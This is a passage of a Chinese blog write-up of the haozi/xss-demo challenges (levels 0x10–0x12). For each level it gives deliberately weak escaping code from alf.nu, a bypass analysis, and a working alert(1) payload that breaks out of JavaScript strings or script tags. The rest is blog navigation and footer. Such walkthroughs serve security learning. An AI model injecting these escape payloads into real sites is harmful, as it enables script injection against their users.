+<h2 id="html-16"><a href="#html-16" class="headerlink" title="html:"></a>html:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.data = <span class="number">123</span>;alert(<span class="number">1</span>)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/010.png" alt="010"></p>
+<h1 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h1><h2 id="server-code-17"><a href="#server-code-17" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'\\\''</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">'\\`'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\74'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'\\76'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">'\\r'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">'\\t'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">'\\f'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">'\\v'</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, '\\b')</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">'\\0'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = 'javascript:console.log("<span class="subst">$&#123;s&#125;</span>")'</span></span><br><span class="line"><span class="string">  var a = document.createElement('a')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-17"><a href="#分析-17" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将"替代<span class="symbol">\"</span>,构造闭合绕过,这里的坑是它替代的<span class="symbol">\需</span>要手动加一个、</span><br><span class="line">因为" 被转义成 <span class="symbol">\"</span> 经过html 解析后 console.log("<span class="symbol">\"</span>)会报语法错误, 再补个 <span class="symbol">\ </span>即可</span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-17"><a href="#input-code-17" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="string">"),alert("</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html-17"><a href="#html-17" class="headerlink" title="html:"></a>html:</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.  </span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="selector-tag">var</span> url = <span class="string">'javascript:console.log("\"),alert(\"1")'</span></span><br><span class="line">  <span class="selector-tag">var</span> <span class="selector-tag">a</span> = document.createElement(<span class="string">'a'</span>)</span><br><span class="line">  <span class="selector-tag">a</span><span class="selector-class">.href</span> = url</span><br><span class="line">  document<span class="selector-class">.body</span><span class="selector-class">.appendChild</span>(a)</span><br><span class="line">  <span class="selector-tag">a</span>.click()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/011.png" alt="011"></p>
+<h1 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h1><h2 id="server-code-18"><a href="#server-code-18" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> <span class="params">(s)</span> &#123;</span></span><br><span class="line">  s = s.replace(/<span class="string">"/g, '</span>\\<span class="string">"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("</span><span class="string">' + s + '</span><span class="string">");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-18"><a href="#分析-18" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造闭合</span><br><span class="line">1. 可以用”)闭合console.log(",后利用注释</span><br><span class="line">2. 用<span class="tag">&lt;/<span class="name">script</span>&gt;</span>闭合<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-18"><a href="#input-code-18" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. \<span class="string">");alert(1)&lt;!-- 或 \"</span>);alert(<span class="number">1</span>)//</span><br><span class="line"><span class="number">2</span>. </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html-18"><a href="#html-18" class="headerlink" title="html:"></a>html:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"\\"</span>);alert(<span class="string">`1`</span>);<span class="xml"><span class="comment">&lt;!--");</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2.</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">console</span>.log(<span class="string">"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">");</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/012.png" alt="012"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-heart"></i>感谢阅读-------------</div>
+    
+</div>
+  
+</div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/10/DVWA-XSS‘反射型’手记/" rel="prev" title="DVWA-xss‘反射型’手记">
+                <i class="fa fa-chevron-left"></i> DVWA-xss‘反射型’手记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/07/sqli-labs-lession-28a-GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号/" rel="next" title="sqli-labs lession-28a GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号">
+                sqli-labs lession-28a GET基于盲注-你的UNION和SELECT归我所有-字符型单引号和括号 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <a href="/">
+                <img class="site-author-image" itemprop="image" src="/images/jack.jpg" alt="嘤嘤怪er">
+              </a>
+            
+              <p class="site-author-name" itemprop="name">嘤嘤怪er</p>
+              <p class="site-description motion-element" itemprop="description">0menc</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">101</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#haozi-xss-demo笔记"><span class="nav-number">1.</span> <span class="nav-text">haozi/xss-demo笔记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00"><span class="nav-number">2.</span> <span class="nav-text">0x00</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code"><span class="nav-number">2.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">2.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code"><span class="nav-number">2.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html"><span class="nav-number">2.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01"><span class="nav-number">3.</span> <span class="nav-text">0x01</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-1"><span class="nav-number">3.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-1"><span class="nav-number">3.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-1"><span class="nav-number">3.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-1"><span class="nav-number">3.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02"><span class="nav-number">4.</span> <span class="nav-text">0x02</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-2"><span class="nav-number">4.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-2"><span class="nav-number">4.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-2"><span class="nav-number">4.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-2"><span class="nav-number">4.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03"><span class="nav-number">5.</span> <span class="nav-text">0x03</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-3"><span class="nav-number">5.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-3"><span class="nav-number">5.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-3"><span class="nav-number">5.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-3"><span class="nav-number">5.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04"><span class="nav-number">6.</span> <span class="nav-text">0x04</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-4"><span class="nav-number">6.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-4"><span class="nav-number">6.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-4"><span class="nav-number">6.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-4"><span class="nav-number">6.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05"><span class="nav-number">7.</span> <span class="nav-text">0x05</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-5"><span class="nav-number">7.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-5"><span class="nav-number">7.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-5"><span class="nav-number">7.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-5"><span class="nav-number">7.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06"><span class="nav-number">8.</span> <span class="nav-text">0x06</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-6"><span class="nav-number">8.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-6"><span class="nav-number">8.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-6"><span class="nav-number">8.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-6"><span class="nav-number">8.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x07"><span class="nav-number">9.</span> <span class="nav-text">0x07</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-7"><span class="nav-number">9.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-7"><span class="nav-number">9.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-7"><span class="nav-number">9.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-7"><span class="nav-number">9.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x08"><span class="nav-number">10.</span> <span class="nav-text">0x08</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-8"><span class="nav-number">10.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-8"><span class="nav-number">10.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-8"><span class="nav-number">10.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-8"><span class="nav-number">10.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x09"><span class="nav-number">11.</span> <span class="nav-text">0x09</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-9"><span class="nav-number">11.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-9"><span class="nav-number">11.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-9"><span class="nav-number">11.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-9"><span class="nav-number">11.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0A"><span class="nav-number">12.</span> <span class="nav-text">0x0A</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-10"><span class="nav-number">12.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-10"><span class="nav-number">12.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-10"><span class="nav-number">12.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-10"><span class="nav-number">12.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0B"><span class="nav-number">13.</span> <span class="nav-text">0x0B</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-11"><span class="nav-number">13.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-11"><span class="nav-number">13.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-11"><span class="nav-number">13.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-11"><span class="nav-number">13.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0C"><span class="nav-number">14.</span> <span class="nav-text">0x0C</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-12"><span class="nav-number">14.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-12"><span class="nav-number">14.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-12"><span class="nav-number">14.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-12"><span class="nav-number">14.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0D"><span class="nav-number">15.</span> <span class="nav-text">0x0D</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-13"><span class="nav-number">15.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-13"><span class="nav-number">15.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-13"><span class="nav-number">15.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-13"><span class="nav-number">15.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0E"><span class="nav-number">16.</span> <span class="nav-text">0x0E</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-14"><span class="nav-number">16.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-14"><span class="nav-number">16.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-14"><span class="nav-number">16.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-14"><span class="nav-number">16.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0F"><span class="nav-number">17.</span> <span class="nav-text">0x0F</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-15"><span class="nav-number">17.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-15"><span class="nav-number">17.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-15"><span class="nav-number">17.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-15"><span class="nav-number">17.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x10"><span class="nav-number">18.</span> <span class="nav-text">0x10</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-16"><span class="nav-number">18.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-16"><span class="nav-number">18.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-16"><span class="nav-number">18.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-16"><span class="nav-number">18.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x11"><span class="nav-number">19.</span> <span class="nav-text">0x11</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-17"><span class="nav-number">19.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-17"><span class="nav-number">19.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-17"><span class="nav-number">19.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-17"><span class="nav-number">19.4.</span> <span class="nav-text">html:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x12"><span class="nav-number">20.</span> <span class="nav-text">0x12</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#server-code-18"><span class="nav-number">20.1.</span> <span class="nav-text">server code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-18"><span class="nav-number">20.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#input-code-18"><span class="nav-number">20.3.</span> <span class="nav-text">input code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#html-18"><span class="nav-number">20.4.</span> <span class="nav-text">html:</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">嘤嘤怪er</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+<script type="text/javascript">
+
+    var a_idx = 0;
+    jQuery(document).ready(function($) {
+        $("body").click(function(e) {
+            var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");
+            var $i = $("<span />").text(a[a_idx]);
+            a_idx = (a_idx + 1) % a.length;
+            var x = e.pageX,
+                y = e.pageY;
+            $i.css({
+                "z-index": 99999999999999999999999999999999999999999999999999999999999999999999999999 ,
+                "top": y - 20,
+                "left": x,
+                "position": "absolute",
+                "font-weight": "bold",
+                "color": "#ff6651"
+            });
+            $("body").append($i);
+            $i.animate({
+                    "top": y - 180,
+                    "opacity": 0
+                },
+                1500,
+                function() {
+                    $i.remove();
+                });
+        });
+    });
+</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300,"bottom":-40},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
